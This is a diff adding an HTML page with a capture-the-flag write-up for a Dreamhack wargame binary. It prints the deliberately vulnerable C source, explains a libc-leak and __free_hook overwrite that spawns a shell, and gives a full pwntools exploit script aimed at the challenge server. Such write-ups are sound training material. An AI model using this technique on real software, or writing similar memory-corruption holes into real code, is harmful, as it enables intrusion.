@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be seen <a href="https://dreamhack.io/wargame/challenges/355">here</a>.</p>
+        <p>The source code of the target program is as below</p>
+        <pre><code>
+// Name: fho.c
+// Compile: gcc -o fho fho.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+  char buf[0x30];
+  unsigned long long *addr;
+  unsigned long long value;
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  puts("[1] Stack buffer overflow");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  puts("[2] Arbitary-Address-Write");
+  printf("To write: ");
+  scanf("%llu", &addr);
+  printf("With: ");
+  scanf("%llu", &value);
+  printf("[%p] = %llu\n", addr, value);
+  *addr = value;
+
+  puts("[3] Arbitrary-Address-Free");
+  printf("To free: ");
+  scanf("%llu", &addr);
+  free(addr);
+
+  return 0;
+}
+        </code></pre>
+        <p>
+            My first instinct was to leak the canary and overwrite the return address, but then i realized I don't need to preserve the canary since <code>free()</code> 
+            is called before <code>main</code> returns.
+            So we first leak the return address stored in the stack frame of main. Disassembling <code>__libc_start_main</code> 
+            let's us know that the return address is 231 bytes from the base of <code>__libc_start_main</code>. We can use this fact to calculate libc's base.
+            After getting libc's base, the only things left to do is calculate the address of <code>__free_hook</code>, <code>system</code>, and <code>"/bin/sh"</code>, 
+            and overwriting <code>__free_hook</code> with <code>system</code>. Then finally we input the address to "/bin/sh" as the argument of <code>free</code>, calling system(/bin/sh).
+        </p>
+        <p>The exploit code is as below.</p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    #p = process("./fho")
+    p = remote("localhost", 7182)
+    p = remote("host3.dreamhack.games", 19665)
+    libc = ELF("./libc-2.27.so")
+    # context.log_level = "debug"
+    p.sendafter(b"Buf: ", b"A"*72)
+    ret_addr_bytes = p.recvline().rstrip().split(b": ")[1][72:] + b"\x00\x00"
+    ret_addr = u64(ret_addr_bytes)
+    print("return address of main is %x" % ret_addr)
+    libc_base = ret_addr - 231 - libc.symbols["__libc_start_main"]
+    print("libc_base: %x" % libc_base)
+    free_hook_addr = libc_base + libc.symbols["__free_hook"]
+    system_addr = libc_base + libc.symbols["system"]
+    binsh = libc_base + next(libc.search(b"/bin/sh"))
+    p.sendlineafter(b"To write: ", bytes(str(free_hook_addr), 'ascii'))
+    p.sendlineafter(b"With: ", bytes(str(system_addr), 'ascii'))
+    p.sendlineafter(b"To free: ", bytes(str(binsh), 'ascii'))
+    p.interactive()
+
+if __name__ == "__main__": ex()
+        </code></pre>
+    </main>
+</body>
+</html>
